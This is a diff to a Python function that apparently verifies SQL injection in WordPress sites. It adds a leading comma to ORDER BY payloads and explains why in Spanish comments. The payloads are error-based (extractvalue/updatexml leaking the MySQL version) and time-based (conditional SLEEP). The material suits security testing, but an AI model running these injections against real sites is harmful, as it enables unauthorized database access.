@@ -2930,9 +2930,16 @@ def verify_wordpress_sqli(
             step("time-based blind (contexto WHERE) tampoco mostro diferencia; probando "
                  "contexto ORDER BY -- el valor inyectado es una subconsulta completa, sin "
                  "AND/OR ni comillas...")
+            # prefijo ',' obligatorio: el valor inyectado se coloca DESPUES de 'created_at'
+            # como segunda columna de ORDER BY (ej. ORDER BY created_at ,(SELECT...)).
+            # Sin la coma, MySQL interpreta la subconsulta como un segundo token inesperado
+            # tras el nombre de columna y lanza un error de SINTAXIS (no el error XPATH que
+            # buscamos). Con la coma, la subconsulta es una expresion valida en el ORDER BY y
+            # se evalua aunque la tabla este vacia -- el error XPATH se genera en tiempo de
+            # evaluacion de la expresion, antes de que haya filas que ordenar.
             orderby_error_payloads = [
-                "(SELECT extractvalue(1,concat(0x7e,version())))",
-                "(SELECT updatexml(1,concat(0x7e,version()),1))",
+                ",(SELECT extractvalue(1,concat(0x7e,version())))",
+                ",(SELECT updatexml(1,concat(0x7e,version()),1))",
             ]
             orderby_error_tried = []
             orderby_error_found = None
@@ -2978,10 +2985,14 @@ def verify_wordpress_sqli(
                 # inyeccion -- el par condicional (1=1 vs 1=2, mismo SLEEP) aisla justamente eso.
                 step("error-based en contexto ORDER BY no filtro nada; probando time-based "
                      "CONDICIONAL (CASE WHEN) en el mismo contexto...")
+                # mismo prefijo ',' que en error_payloads -- sin el la sintaxis es invalida.
+                # El par condicional (1=1 vs 1=2) demuestra que es la condicion, no el contexto,
+                # la que controla el retraso. El par incondicional (SLEEP(5) vs SLEEP(0)) sirve
+                # de ultimo recurso si la subconsulta CASE se evalua en contexto de fila vacia.
                 orderby_timing_pairs = [
-                    ("(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)",
-                     "(SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)"),
-                    ("(SELECT SLEEP(5))", "(SELECT SLEEP(0))"),
+                    (",(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)",
+                     ",(SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)"),
+                    (",(SELECT SLEEP(5))", ",(SELECT SLEEP(0))"),
                 ]
                 for slow_p, fast_p in orderby_timing_pairs:
                     try:
